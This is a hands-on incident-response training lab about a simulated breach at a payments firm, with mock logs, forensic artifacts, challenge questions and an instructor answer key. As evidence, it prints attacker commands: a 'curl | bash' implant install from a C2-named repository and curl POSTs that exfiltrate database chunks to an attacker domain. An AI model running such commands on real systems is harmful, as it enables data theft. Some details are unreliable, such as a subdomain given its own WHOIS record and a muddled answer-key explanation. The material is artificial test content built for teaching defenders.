# Operation Ghostwire (Learn Security by Doing)
---

> **Briefing**
>
> You are the second analyst on this case. The first analyst started investigating an anomaly in NovaPay's payment infrastructure — and then went quiet. You inherit their half-finished notes and four raw evidence files. An active breach is underway. The attacker is still in the network, hiding in plain sight behind a service account that looks completely legitimate.
>
> Your job: reconstruct the full attack chain, identify what data was stolen, call out the one red herring the first analyst missed — and write the CISO briefing before end of day.

---

## The Attack Chain (reconstruct this)

```
[Stage 1: Recon] → [Stage 2: Spearphish] → [Stage 3: OAuth Token Theft]
       → [Stage 4: Lateral Movement] → [Stage 5: Data Staging] → [Stage 6: Exfil]
```

Four deliberate traps are hidden across the evidence files:

| Trap | Description |
|------|-------------|
| Trap 1 | `svc_metrics` service account — looks like legit infra. Is it? |
| Trap 2 | C2 beacon disguised as metrics traffic — valid TLS cert, port 443 |
| Trap 3 | One alarming finding is actually **authorized** (the red herring) |
| Trap 4 | Logs are in three different timezones. Do the math. |

---

## Evidence File 1 — Email Headers & OAuth Logs

### Section A: Suspicious Email (reported by Priya Nair, Finance Team)

```
Received: from mail-pl1-f173.google.com (209.85.214.173)
        by mx.novapay.io with ESMTPS
        for <p.nair@novapay.io>; Mon, 11 Mar 2024 09:14:22 +0530

Return-Path: <support@novapay-helpdesk.com>
From: "NovaPay IT Support" <support@novapay-helpdesk.com>
To: p.nair@novapay.io
Subject: [URGENT] Re-authorize your payment portal access — expires today

Authentication-Results: mx.novapay.io;
       dkim=fail (signature did not verify) header.d=novapay-helpdesk.com;
       spf=softfail smtp.mailfrom=support@novapay-helpdesk.com;
       dmarc=fail (p=NONE) header.from=novapay-helpdesk.com

X-Originating-IP: 209.85.214.173   ← Gmail SMTP relay
X-Mailer: Microsoft Outlook 16.0   ← inconsistent with Gmail relay

--- EMAIL BODY ---
Dear Priya,

Your access to the NovaPay payment portal will expire in 2 hours due to
a scheduled security upgrade. Please re-authorize by clicking the link below.
Failure to re-authorize may result in a compliance violation.

[Re-authorize Access] → https://novapay-auth.vercel.app/oauth/reauth?token=eyJ...

— NovaPay IT Security Team
```

### Section B: Okta (OAuth / Identity Provider) Logs
> **Note:** Okta logs are in **UTC**. India is **UTC+5:30**.

```
2024-03-11T03:38:44Z  [INFO]   user=p.nair  event=user.authentication.sso
                               client_ip=103.21.58.77  geo=Bengaluru,IN
                               device=Chrome/MacOS  mfa=TOTP_SUCCESS

2024-03-11T03:44:51Z  [INFO]   user=p.nair  event=app.oauth2.token.grant
                               scope=openid profile email payments:read payments:write
                               client_id=novapay-portal          ← legitimate app

2024-03-11T03:45:18Z  [INFO]   user=p.nair  event=app.oauth2.token.grant
                               scope=openid profile email payments:read payments:write
                               client_id=novapay-reauth-tool     ← NOT a registered internal app

2024-03-11T03:45:19Z  [WARN]   user=p.nair  event=app.oauth2.as.token.revoke
                               token_type=refresh_token  reason=user_logout

2024-03-11T03:45:20Z  [INFO]   event=app.oauth2.token.grant
                               scope=payments:read payments:write admin:users
                               client_id=novapay-reauth-tool  client_ip=185.220.101.55
                               user=p.nair   ← REPLAY — different IP, 1 second later

2024-03-11T04:02:17Z  [INFO]   event=app.oauth2.token.refresh
                               client_id=novapay-reauth-tool  client_ip=185.220.101.55

2024-03-11T04:02:18Z  [INFO]   event=system.api.user.create
                               actor=p.nair  new_user=svc_metrics
                               role=service_account  scopes=payments:read metrics:read
                               client_ip=185.220.101.55
```

> **First analyst's note (incomplete):**
> *"svc_metrics created at 09:32 AM. Priya says she was in a stand-up meeting from 09:00–09:45. Need to check if... [NOTE ENDS]"*

### Challenge Questions — Evidence File 1

**Q1. Email Headers**

a) The email domain is `novapay-helpdesk.com`. NovaPay's real domain is `novapay.io`. What is this technique called? How would you verify ownership of the sending domain?

b) `dkim=fail` AND `dmarc=fail`. What do these protocols check? Why didn't the email get blocked? *(Hint: look at the DMARC policy value `p=NONE`)*

c) `X-Mailer` says Outlook, but the relay is Gmail SMTP. What does this inconsistency reveal about the attacker's setup?

**Q2. OAuth Logs**

a) At `03:44:51Z`, Priya grants a token to `novapay-portal` (legitimate). At `03:45:18Z`, she grants a token to `novapay-reauth-tool` (unknown). How was the second token grant triggered without her noticing?

b) At `03:45:20Z`, the same token is replayed from IP `185.220.101.55`, exactly 1 second after it was issued from `103.21.58.77`. What does this 1-second gap and IP change tell you? *(Look up what 185.220.101.55 is — it's a known type of infrastructure)*

c) At `04:02:18Z`, a new service account `svc_metrics` is created, attributed to Priya. But was Priya actually at her keyboard? Cross-reference the timestamps carefully. Show your working.

**Q3. Big Picture**

The attacker now has a service account with `payments:read` and `metrics:read`. Why create a persistent service account instead of just continuing to use Priya's stolen token? What does this tell you about their next move?

---

## Evidence File 2 — Network Traffic Analysis

> **Source:** AWS VPC Flow Logs + Egress Proxy Logs  
> **All timestamps: UTC**

### Section A: VPC Flow Logs — Internal East-West Traffic
Source host: `payment-api-server (10.0.2.44)` · Period: `11 Mar 2024 04:00Z–06:00Z`

```
04:03:11Z  10.0.2.44  → 10.0.5.12:5432   ACCEPT  bytes=248       ← payment DB, normal query
04:03:12Z  10.0.2.44  → 10.0.5.12:5432   ACCEPT  bytes=248       ← payment DB, normal query
04:04:55Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=248       ← NEW SOURCE IP
04:04:56Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=18,942    ← much larger
04:05:02Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=87,340    ← escalating
04:05:08Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=241,887   ← ~236 KB in one query
04:05:14Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=241,887
04:05:20Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=241,887   ← repeating every 6 seconds
04:05:26Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=241,887
04:05:32Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=241,887
04:05:38Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=241,887
04:06:41Z  10.0.3.19  → 10.0.5.12:5432   ACCEPT  bytes=12        ← keepalive?

Internal DNS: 10.0.3.19 → svc-metrics-collector.novapay.internal
```

### Section B: Egress Proxy Logs — Outbound HTTPS from 10.0.3.19

```
TIME(UTC)    SRC_IP      DST_HOST                    PORT  BYTES_OUT  STATUS
04:07:03Z   10.0.3.19   metrics.novapay.io           443   1,842      200
04:09:03Z   10.0.3.19   metrics.novapay.io           443   1,844      200
04:11:03Z   10.0.3.19   metrics.novapay.io           443   1,847      200
04:13:03Z   10.0.3.19   metrics.novapay.io           443   1,841      200
04:15:03Z   10.0.3.19   metrics.novapay.io           443   1,843      200
...         [pattern continues every 120 seconds for 4 hours]
08:01:03Z   10.0.3.19   metrics.novapay.io           443   241,891    200  ← SPIKE
08:03:03Z   10.0.3.19   metrics.novapay.io           443   1,841      200  ← back to normal
```

**TLS Certificate for `metrics.novapay.io`:**
```
Subject:    CN=metrics.novapay.io
Issuer:     Let's Encrypt Authority X3
Valid from: 2024-03-10 00:00:00 UTC   ← issued YESTERDAY
Valid to:   2024-06-08 00:00:00 UTC
```

**WHOIS comparison:**

| Domain | Registrar | Registered | Registrant |
|--------|-----------|------------|------------|
| `metrics.novapay.io` | Namecheap | 2024-03-09 | [REDACTED — privacy guard] |
| `novapay.io` (legitimate) | GoDaddy | 2019-04-15 | NovaPay Technologies Pvt Ltd |

### Section C: DNS Logs — Queries from 10.0.3.19

```
04:06:59Z   QUERY  metrics.novapay.io      → 104.21.77.93   TTL=60   ← low TTL
04:07:01Z   QUERY  api.novapay.io          → 18.185.44.12   TTL=300  ← legitimate
04:07:02Z   QUERY  db.novapay.internal     → 10.0.5.12      TTL=300  ← legitimate
```

> **Note:** The legitimate internal metrics server is `metrics.novapay.internal (10.0.4.88)`.
> `metrics.novapay.io` is an **entirely different domain** despite the similar name.

### Challenge Questions — Evidence File 2

**Q1. VPC Flow Logs**

a) Who or what is `10.0.3.19`? Why does it suddenly appear querying the payment DB at `04:04:55Z`? Cross-reference Evidence File 1 to answer.

b) Query sizes escalate: `248 → 18,942 → 87,340 → 241,887 → [repeating]`. What does this pattern suggest the attacker is doing? What is this technique called?

c) The 6-second interval is suspiciously regular. What does this regularity suggest about how the reads are triggered?

**Q2. Proxy Logs — the hardest part**

a) Traffic to `metrics.novapay.io` fires every exactly 120 seconds. Payload varies by only ~8 bytes (1,839–1,847 bytes). What type of network behavior is this? What is it called?

b) At `08:01:03Z`, one request sends 241,891 bytes — the same size as the DB read chunks in Section A. Connect these two evidence sources. What just happened?

c) The TLS certificate is valid and issued by Let's Encrypt, so the proxy didn't block it. Why is a valid TLS cert NOT proof of legitimacy? What should the proxy have checked instead?

**Q3. DNS**

a) The real internal metrics server is `metrics.novapay.internal`. The attacker's C2 is `metrics.novapay.io`. Why is this naming choice clever?

b) `metrics.novapay.io` has TTL=60. Legitimate services have TTL=300. What can a very low TTL indicate? *(Hint: search "fast flux DNS")*

c) What DNS-based detection technique could have caught this?

**Q4. Red Herring Alert**

One of the following is actually **authorized and not malicious**. Which one, and how would you confirm it?

- `svc-metrics-collector` querying the payment DB
- `svc-metrics-collector` sending HTTPS to `metrics.novapay.io`
- `payment-api-server (10.0.2.44)` talking to the DB
- The Let's Encrypt certificate on `metrics.novapay.io`

---

## Evidence File 3 — Endpoint Forensics

> **Host:** AWS EC2 instance `i-0a8b4f3c` · hostname: `svc-metrics-collector`  
> **OS:** Ubuntu 22.04 LTS · Instance type: t3.micro

### Section A: Process List — captured at `2024-03-11T05:30:00Z`

```
PID    PPID   USER     START   CMD
1      0      root     04:02   /sbin/init
504    1      root     04:02   sshd: /usr/sbin/sshd -D
812    504    ubuntu   04:03   sshd: ubuntu@pts/0
813    812    ubuntu   04:03   -bash
1001   813    ubuntu   04:03   python3 /opt/metrics/collector.py
1002   1001   ubuntu   04:03   python3 /opt/metrics/collector.py  ← forked
1101   1002   ubuntu   04:05   /bin/sh -c "psql postgresql://svc_metrics:REDACTED@10.0.5.12..."
1102   1101   ubuntu   04:05   psql postgresql://svc_metrics:[REDACTED]@10.0.5.12/payments_db
2201   1      root     04:07   curl -s -X POST https://metrics.novapay.io/v1/ingest \
                                    -H "Authorization: Bearer eyJhbGc..." \
                                    -d @/tmp/.cache/chunk_001.bin
2202   1      root     04:09   curl -s -X POST https://metrics.novapay.io/v1/ingest \
                                    -H "Authorization: Bearer eyJhbGc..." \
                                    -d @/tmp/.cache/chunk_002.bin
...
[PIDs 2203–2320: identical curl commands with incrementing chunk filenames]
```

### Section B: Filesystem Artifacts

```bash
$ ls -la /opt/metrics/
-rwxr-xr-x  1 ubuntu ubuntu 8841 Mar 11 04:02 collector.py
-rw-r--r--  1 ubuntu ubuntu  312 Mar 11 04:02 config.json

$ cat /opt/metrics/config.json
{
  "db_host": "10.0.5.12",
  "db_name": "payments_db",
  "db_user": "svc_metrics",
  "ingest_endpoint": "https://metrics.novapay.io/v1/ingest",
  "ingest_interval_seconds": 120,
  "query": "SELECT * FROM transactions ORDER BY created_at DESC",
  "chunk_size": 247552,
  "staging_dir": "/tmp/.cache/",
  "cleanup_after_send": true
}

$ ls -la /tmp/.cache/
[DIRECTORY IS EMPTY — cleanup_after_send deleted all chunks]

$ grep collector /var/log/syslog | head -10
Mar 11 04:03:01  systemd[1]: Started metrics-collector.service
Mar 11 04:03:01  collector.py[1001]: Connected. Running query...
Mar 11 04:05:14  collector.py[1001]: Query returned 8,847 rows
Mar 11 04:05:14  collector.py[1001]: Staging 37 chunks to /tmp/.cache/
Mar 11 04:05:14  collector.py[1001]: Sending chunk 1/37 to ingest endpoint
...
Mar 11 05:17:43  collector.py[1001]: Chunk 37/37 sent. Cleaning up.
Mar 11 05:17:43  collector.py[1001]: Exfiltration complete.   ← verbatim in syslog

$ cat /etc/systemd/system/metrics-collector.service
[Unit]
Description=NovaPay Metrics Collector
After=network.target

[Service]
Type=simple
User=ubuntu
ExecStart=/usr/bin/python3 /opt/metrics/collector.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

### Section C: Bash History — user ubuntu

```bash
  1  uname -a
  2  id
  3  cat /etc/passwd | grep -v nologin
  4  ls /opt/
  5  curl -s https://raw.githubusercontent.com/ghostwire-c2/implant/main/install.sh | bash
  6  [HISTORY CLEARED]
  7  ls /opt/metrics/
  8  cat /opt/metrics/config.json
  9  systemctl enable metrics-collector.service
 10  systemctl start metrics-collector.service
 11  history -c
```

> **Note:** Line 5 URL now returns 404 — the repo was deleted or made private.

### Challenge Questions — Evidence File 3

**Q1. Process List**

a) PID 1002 is a fork of PID 1001 (`collector.py`), which then spawns a `psql` shell command. Why does spawning system shell commands from a Python process matter from a detection standpoint? What would a legitimate metrics tool do differently?

b) The curl processes (PID 2201+) show `PPID=1` (root), but `collector.py` runs as `ubuntu`. How did commands from `collector.py` end up running as root? There is a subtle error planted in the systemd unit above — find it.

c) The staging directory is `/tmp/.cache/` — a hidden directory inside `/tmp`. Why is `/tmp` a common attacker staging location?

**Q2. Filesystem**

a) `config.json` contains `"query": "SELECT * FROM transactions ORDER BY created_at DESC"`. What is dangerous about `SELECT *` on a payments table? What compliance frameworks govern this data exposure?

b) The syslog contains the word `"Exfiltration complete."` verbatim. What does this tell you about the attacker's OPSEC quality?

c) `cleanup_after_send=true` deleted all chunk files. Is the data unrecoverable? List at least 3 forensic sources where evidence might still exist.

**Q3. Bash History**

a) Line 5: `curl -s [URL] | bash`. Explain exactly what this command does and why security professionals consider it dangerous even when the URL is trusted.

b) The attacker ran `history -c` on line 11, yet the history file still shows entries. Why? What does this reveal about how bash history actually works?

c) The install script URL returns 404. Does that mean you cannot recover what it contained? What service or platform might have a cached copy?

**Q4. Synthesis**

The `svc_metrics` DB user was created at `04:02:18Z` (Evidence File 1).  
This script started connecting to the DB at `04:03:01Z`.  
That is a **43-second gap**.

What had to happen in those 43 seconds? List the steps in order.

---

## Evidence File 4 — The Twist

### Section A: Email from CTO Arjun Mehta — `2024-03-11 11:00 IST`

```
FROM: a.mehta@novapay.io
TO: security@novapay.io
SUBJECT: RE: Incident — clarification needed

Team,

A few things need clarification before you escalate this:

1. svc-metrics-collector (10.0.3.19) IS a legitimate server. Provisioned
   last week by DevOps for a new observability project. I authorized it.

2. HOWEVER — it should only send data to metrics.novapay.INTERNAL (10.0.4.88),
   not to any external endpoint.

3. The service account "svc_metrics" in the DB should have READ-ONLY access
   to the "app_metrics" table only. NOT the full "transactions" table.

4. The real collector.py (written by Rohan) does NOT run psql directly.
   It uses SQLAlchemy with parameterized queries on app_metrics only.

The attacker appears to have REPLACED the legitimate collector script.

— Arjun

ATTACHED FILE HASHES:
  collector_legitimate.py  →  sha256: a3f9c2d1e4b8...7f3a
  collector.py (current)   →  sha256: 9b7e1a4c3d2f...2c8e
  HASHES DO NOT MATCH.
```

### Section B: The Red Herring — Revealed

The **server** (`svc-metrics-collector`) is legitimate infrastructure.  
The **script** (`collector.py`) running on it has been replaced by the attacker.  
The **DB user** (`svc_metrics`) was created by the attacker via Priya's hijacked session.

The first analyst's draft report recommended: *"Terminate svc-metrics-collector instance immediately."*

**Should you follow this recommendation?**

Think carefully. What is the correct IR containment procedure here, and what would you lose if you terminated the instance right now?

### Section C: Threat Intel Notes

**IP `185.220.101.55` (OAuth token replay — Evidence File 1):**
- This is a **Tor exit node** (confirmed via dan.me.uk/torlist)
- The attacker routed only the token replay through Tor, but ran all subsequent C2 traffic through plain Cloudflare
- What does this inconsistency tell you about their OPSEC discipline?

**Domain `metrics.novapay.io` registered 2024-03-09 (two days before the attack):**
- What is this pre-registration technique called?
- How long do most domain reputation blocklists take to flag newly registered domains?
- What window of opportunity does this create for an attacker?

---

## Final Deliverable — CISO Briefing

Write a 1–2 page briefing document. It must include all four parts below.

---

### Part 1: Attack Timeline

Reconstruct every attacker action in chronological order.  
**Convert all timestamps to IST (UTC+5:30).**  
Cite which evidence file each event came from.

Use this format:

```
[TIME IST] | [ACTION] | [SOURCE]
```

---

### Part 2: Impact Assessment

**a) Data volume exfiltrated**

Calculate the total data exfiltrated:
- 8,847 rows across 37 chunks
- Each chunk = 241,887 bytes
- Show the calculation in MB

**b) Data exposure**

What fields would a standard payments `transactions` table contain? What makes this a high-severity breach?

**c) Regulatory obligations**

Under **India's DPDP Act 2023** or **PCI-DSS v4.0**, what are NovaPay's obligations now that cardholder data has been exfiltrated? Consider notification timelines, breach reporting, and technical remediation requirements.

---

### Part 3: The Red Herring Call

Should the `svc-metrics-collector` instance be terminated?

Give a clear **YES or NO** with justification grounded in IR methodology.  
What should happen to it instead?

---

### Part 4: Root Cause & Control Gaps

Identify the **3 core control failures** that made this attack possible.

For each failure:

| Field | Answer |
|-------|--------|
| Control gap | |
| CompTIA Security+ domain | |
| Specific remediation | |

Do not write vague remediations like "improve monitoring." Be specific.

---

### Bonus: Attacker Profile

Based on all four evidence files:

- Was this attacker **sophisticated or opportunistic**? Justify your answer with specific evidence.
- What is the one OPSEC mistake they made that could assist attribution?
- The GitHub repository was named `ghostwire-c2`. What would you do with this information as an analyst?

---

## Instructor Answer Key

> **Remove this section before distributing to the student.**

---

**Timezone math:**  
`svc_metrics` created at `04:02:18Z UTC` = **09:32:48 IST**.  
Priya was in standup `09:00–09:45 IST`.  
This proves the account creation was not her action.

**Token replay:**  
`03:45:18Z UTC` = `09:15:48 IST` — the token was stolen and replayed from a Tor exit node within 1 second of issue.

**The red herring:**  
The SERVER is legitimate. Do **not** terminate.  
Correct action: isolate network interface, preserve volatile memory (RAM dump), take forensic disk image, then begin analysis. Terminating destroys live process memory and any in-flight data.

**Data exfil calculation:**  
37 chunks × 241,887 bytes = 8,949,819 bytes ÷ 1,048,576 = **~8.53 MB**.  
At 120-second intervals, exfil ran from approximately `04:07Z` to `05:17Z` — about 70 minutes.

**DMARC failure:**  
`p=NONE` means monitor only — the policy explicitly tells receiving servers not to block or quarantine. This is the core email security failure. Had it been `p=reject`, the phish would have been blocked at `mx.novapay.io`.

**systemd unit error:**  
The unit file sets `User=ubuntu` but the curl processes show `PPID=1` (root). This is inconsistent — a correctly configured `User=ubuntu` unit would not produce root-owned child processes. The planted error: the `ExecStart` path likely uses a setuid wrapper or the unit was later modified to remove `User=ubuntu`. The student should flag this contradiction and suggest verifying the unit file hash.

**`curl | bash` danger:**  
Executes remote code directly in the current shell with no inspection, no integrity verification, and no sandboxing. Even a trusted URL can be compromised in transit (MITM) or at the source.

**Bash history:**  
`history -c` clears the in-memory history list but does not immediately write to `~/.bash_history`. The file is written when the shell session closes. If the session is still open (or was killed), the pre-clear history may still be on disk.

**GitHub `ghostwire-c2`:**  
Search code aggregators (grep.app, sourcegraph.com), check Wayback Machine for any crawled version, search for the repo name across paste sites and threat intel platforms. Even deleted repos sometimes appear in forks, stars, or cached search results.

**OPSEC inconsistency:**  
Using Tor for the token replay (Stage 3) but routing all C2 through plain Cloudflare suggests the attacker was careful during the initial intrusion phase but became sloppy during the sustained exfil phase — a common pattern indicating moderate skill level, not APT-grade discipline.

**Pre-registration technique:**  
Called domain squatting or typosquatting when mimicking a real domain. The window of opportunity exists because most threat intel feeds and DNS RPZ blocklists rely on domain age + reputation scoring, which takes days to weeks to flag newly registered domains with no history.
